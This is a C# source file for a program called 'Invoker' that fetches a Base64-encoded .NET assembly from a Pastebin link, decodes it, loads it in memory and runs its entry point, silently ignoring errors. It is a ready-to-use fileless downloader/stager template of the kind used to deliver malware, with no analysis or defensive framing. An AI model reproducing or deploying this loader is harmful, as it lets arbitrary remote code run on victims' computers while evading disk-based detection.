using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;

namespace Invoker
{
    class Program
    {

        public static string Link = "Your Base64 Encoded Program Text Put Into a Raw Pastebin Link Here";

        static void Main(string[] args)
        {
            Thread thread = new Thread(Execute);      //We make it into a new thread because
            thread.Start();                           //I got exceptions when I didn't.
            Environment.Exit(0);
        }

        /// <summary>
        /// Download and convert the pastebin paste into bytes then execute said bytes.
        /// </summary>
        static void Execute()
        {
            byte[] bytes = Convert.FromBase64String(new WebClient().DownloadString(Link));
            if (bytes.Length > 0)
            {
                try
                {
                    Assembly assembly = Assembly.Load(bytes);
                    object[] paramData = null;
                    if (assembly.EntryPoint.GetParameters().Length > 0)
                        paramData = new object[] { new string[] { null } };
                    MethodInfo info = assembly.EntryPoint;
                    assembly.EntryPoint.Invoke(assembly.CreateInstance(info.Name), paramData);
                }
                catch { } // Handle the error if you want, I choose not to.
            }
        }
    }
}
